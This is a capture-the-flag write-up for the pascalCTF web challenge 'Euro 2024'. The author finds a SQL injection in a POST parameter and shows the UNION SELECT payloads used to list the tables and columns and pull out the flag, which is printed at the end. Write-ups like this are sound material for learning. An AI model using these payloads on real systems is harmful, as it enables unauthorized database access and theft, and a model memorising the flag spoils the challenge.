# Challenge WEB: Euro 2024.
![image](https://github.com/user-attachments/assets/c85119b3-84ee-4a41-ba14-890a28910353)

first i tried to look at the match tables on the website and i saw there were quite a few tables from A to F.
![image](https://github.com/user-attachments/assets/21e08a63-f222-4b1a-8d2b-4b9a1e6fefed)

I went to view the source and found some useful information.
![image](https://github.com/user-attachments/assets/6375f9b6-11e7-4b9c-a6b4-4cb78e0f88b0)


according to this command i can send method is POST, in body part i can pass value for it and headers:'content-type': 'application/x-www-form-urlencoded' . i did it by command and get request on burp suite:
![image](https://github.com/user-attachments/assets/c0b404b4-9660-47b0-a0aa-deafcb099bf8)

![image](https://github.com/user-attachments/assets/e9647322-c8cb-48ee-838e-7dbda05c9d2b)

I looked at the source: server.js and saw a section that I guess is highly likely to be a SQLi vulnerability
![image](https://github.com/user-attachments/assets/43c8c780-561c-4d01-8b48-427e4336a66e)

I tried passing the SQLi payload: 'or 1=1;-- and noticed there are quite a few tables with columns:
![image](https://github.com/user-attachments/assets/4cafb1bd-57ad-4e82-81b3-8229cd602edd)

I determined that it has 8 tables but here, I don't see anything strange so I use the payload: ' UNION SELECT null, table_name, null, null, null, null, null, null FROM information_schema.tables -- , and get all the tables back, including the flag table name.
![image](https://github.com/user-attachments/assets/e0223a0a-9226-496e-ab06-1796d74f5c8a)

so according to the information I got it will have, 8 columns and 1 flag table, I tried again: ' UNION SELECT null, column_name, null, null, null, null, null, null FROM information_schema.columns WHERE table_name='flag' -- , and found the correct table name is flag
![image](https://github.com/user-attachments/assets/ee89f872-b0ef-4aa8-b179-c6ee5b545856)

Next let's access the flag table with a single column: group=' UNION SELECT null, flag, null, null, null, null, null, null FROM flag --
![image](https://github.com/user-attachments/assets/762554f4-1080-41aa-9b4f-1392322ee53b)

Problem Solved: pascalCTF{fl4g_is_in_7h3_eyes_of_the_beh0lder}.

